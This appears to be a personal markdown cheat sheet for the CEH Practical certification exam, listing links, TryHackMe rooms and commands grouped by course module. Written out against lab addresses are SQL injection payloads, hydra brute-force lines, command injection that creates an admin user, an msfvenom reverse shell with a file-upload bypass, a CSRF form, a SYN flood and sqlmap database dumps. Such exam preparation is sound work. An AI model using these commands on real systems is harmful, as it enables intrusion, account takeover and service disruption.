# CEH Practical Prep
- nmap - https://www.stationx.net/nmap-cheat-sheet/
- sqlmap - https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/
- wireshark - https://unit42.paloaltonetworks.com/using-wireshark-display-filter-expressions/
- wpscan - https://www.poftut.com/how-to-scan-wordpress-sites-with-wpscan-tutorial-for-security-vulnerabilities/
- hydra - https://securitytutorials.co.uk/brute-forcing-passwords-with-thc-hydra/
- john - https://linuxconfig.org/password-cracking-with-john-the-ripper-on-linux
- hashcat - https://hashcat.net/wiki/doku.php?id=example_hashes
- responder - https://notsosecure.com/pwning-with-responder-a-pentesters-guide/
- CEHv10 iLAB Videos  https://www.youtube.com/playlist?list=PLWGnVet-gN_kGHSHbWbeI0gtfYx3PnDZO
- Ethical Hacking Labs -https://github.com/Samsar4/Ethical-Hacking-Labs

##### TryHackMe Rooms
- WebAppSec101 - https://tryhackme.com/room/webappsec101
- Daily Bugle - https://tryhackme.com/room/dailybugle
- Hydra - https://tryhackme.com/room/hydra
- CrackTheHash - https://tryhackme.com/room/crackthehash

##### Discovery
* netdiscover -i eth0
* fping -a -g subnet 2>/dev/null
* nmap -p- 10.10.10.10
* nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 10.10.10.10
* nmap -sC -sV 10.10.10.10
* gobuster -e -u http://10.10.10.10 -w wordlsit.txt
* dirb http://10.10.10.10 wordlist.txt

###### SQLi manually
* admin' --
* admin' #
* admin'/*
* ' or 1=1--
* ' or 1=1#
* ' or 1=1/*
* ') or '1'='1--
* ') or ('1'='1—
* SQL Cheat Sheet - https://github.com/geoffchisnall/Resources/blob/master/SQL%20Injection%20Cheat%20Sheet.md

###### Custom password lists
* https://github.com/Dormidera/WordList-Compendium
* https://datarecovery.com/rd/default-passwords/
* https://github.com/danielmiessler/SecLists

* cewl is grabbing words from webpage 
* cewl example.com -m 5 -w words.txt 

###### Brute Force services

* hydra
 * hydra -l root -P passwords.txt [-t 32] <IP> ftp
 * hydra -L usernames.txt -P pass.txt <IP> mysql
 * hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
 * hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
 * hydra -P common-snmp-community-strings.txt target.com snmp
 * hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
 * hydra -l root -P passwords.txt <IP> ssh
    
###### searchsploit
* searchsploit “Linux Kernel
* searchsploit -m 7618 — Paste the exploit in the current directory
* searchsploit -p 7618[.c] — Show complete path
* searchsploit — nmap file.xml — Search vulns inside a Nmap XML result

#### Tools that are used in the iLABS

##### Module 2 - Footprinting and Reconaisance 
* tracert/traceroute
* ping
* firebug plugin (old) for browser (same as web developer tools)
* httrack to mirror a site.
* path analyzer pro
* metasploit 
 * service postgresql start 
 * msfconsole
 * db_status
 * msfdb init
 * service postgresql restart
 * nmap -Pn -sS -A -oX test 10.10.10.0/24
 * db_import Test
 * hosts
 * db_nmap -sS -A 10.10.10.16
 * services
 * use scanner/smb/smb_version
 * set RHOSTS 10.10.10.8-16
 * set THREADS 100
 * run
 * os_flavor
               
##### Module 4 - Enumeration
* GNI (Global Network Inventory
* Advanced IP Scanner
* SuperScan
* Hyena
* NetBios Enumerator
* SoftPerfect Netowrk Scanner
* NMAP
* ZenMAP
* nbtstat
* net use
* nmap -sP  10.10.10.0/24 ping sweet
* nmap -sS 10.10.10.0/24 stealth scan
* nmap -sSV -O synscan with OS detection
* nmap -sSV -O -oN enumeration.txt
* nmap -sU -p 161 10.10.10.0/24
* nmap -sU -p 161 --script=snmp-brute 10.10.10.12
* msfconsole
 * use auxiliry/scanner/snmp/snmp_login
 * set RHOSTS 10.10.10.12
 * run
 * use auxiliary/scanner/snmp/snmp_enum
 * set RHOSTS 10.10.10.12
 * run
* LDAP
* ADExplorer
* enum4linux -u user -p passwd -U 10.10.10.12 full output
* enum4linux -u user -p passwd -o 10.10.10.12 OS version
* enum4linux -u user -p passwd -P 10.10.10.12 password policy
* enum4linux -u user -p passwd -G 10.10.10.12 groups
* enum4linux -u user -p passwd -S 10.10.10.12 share policy 
    
##### Module 5 - Vulnerability Analysis
    
* Nessus
* Nikto -h 10.10.10.12 -Tuning 1
    
##### Module 6 - System hacking
    
* RainbowCrack
* Whitespace Stego
* Snow
* Image Stego
* OenStego
* QuickStego
    
##### Module 9 - Social Engineering
    
* SET toolkit
    
##### Module 10 - Denial of Service
    
* wireshark - tcp filter
* hping3 -S 10.10.10.10 -a 10.10.10.11 -p 22 --flood
* HOIC (high orbit Ion Cannon)
    
##### Module 11 - Session Hijacking
    
* OWASP ZAP
* Burpsuite
    
###### Module 12 - Hacking Web Servers
    
* skipfish -o /root/test -S /usr/share/skipfish/dictionaries/complete.wl http://10.10.10.12
* httprecon
* ID Serve
* nmap -p 21 10.10.10.12
* ftp 10.10.10.12
 * anonymous
 * test@test.com
* hydra -L /root/Desktop/Wordlists/Usernames.txt -P root/Desktop/Wordlists/Passwords.txt ftp://10.10.10.12
* uniscan -u http://10.10.10.12
* uniscan -u http://10.10.10.12 -we (robots.txt and sitemap.txt
* uniscan -u http://10.10.10.12 -d dynamic scan (blind SQL)
    
##### Module 14 Hacking Web Applications
    
###### parameter  tampering
* When logged into site with user the following url will show in the address bar 
* http://10.10.10.12/viewprofile.aspx?id=2 change it to http://10.10.10.12/viewprofile.aspx?id=1
    
###### Cross Site Scripting (XSS or CSS)
* <script>alert("XSS Alert")</script>
* wpscan --url 10.10.10.12 --enumerate u
* msfconsole
 * use/auxiliary/scanner/http/wordpress_login_enum
 * set PASS_FILE passwords.txt
 * set RHOSTS 10.10.10.12
 * set RPORT 80
 * set TARGETURI http://10.10.10.12/wordpress
 * set USERNAME admin
 * run
* DVWA (damn vulnerable web app)
###### command injection
* ping | hostname
* ping | net user
* ping | net user TestUser /add
* ping | net localgroup Administrators TestUser /add
* Vega
* Acunetix
* msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.11 lport=4444 -f raw > shell.php
* msfconsole
 * use/multi/handler
* set payload php/meterpreter/reverse_tcp
* set lhost 10.10.10.11
* set lport 4444
* run
when shell connects
* sysinfo
* if .php doesn't upload and says only images like .jpg, .jpeg, .png only allowed rename shell.php to shell.php.jpg
if that doesn't work, rename to shell.php
edit in notepad or vim and add GIF98 in the beginning
* burpsuite
   
###### Upload CSRF
    
* wpscan -u http://10.10.10.12 --enumerate vp
* <form  method="POST" action="https://10.10.10.12/wp-admin/options-general.php?page=wordpress-firewall-2%2Fwordpress-firewall-2.php"><script>alert("As an Admin, To Enable additional security to your website. Click Submimt")</script><input type="hidden" name="whitelisted_ip[]" value="10.10.10.11">
<input type="hidden" name="set_whitelist_ip" value="Set Whitelist IPs" class="button-secondary">
<input type="submit">
</form>
 * save as Security_Script.html
    
##### Module 15 - SQL Injection
    
* blah' or 1=1 --
* blah';insert into login values('jon','pass'); --
* blah';create database newdb; --
* blah';'exec master_xp_cmdshell 'ping 10.10.10.12 -l 65000 -t; --
* NStalker
* inspect element
 * console
 * document.cookie
* sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> --dbs
* sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> -D dbname --tables
* sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> -D dbname -T user_login_table --columns
* sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> -D dbname -T user_login_table --dump
* sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> --os-shell
     
##### Module 20 - Cryptography
    
* HashCalc
* md5calc
* cryptoforge
* BCTextEncoder
* IIS Self Signed Certs
* VeraCrypt
* CrypTool
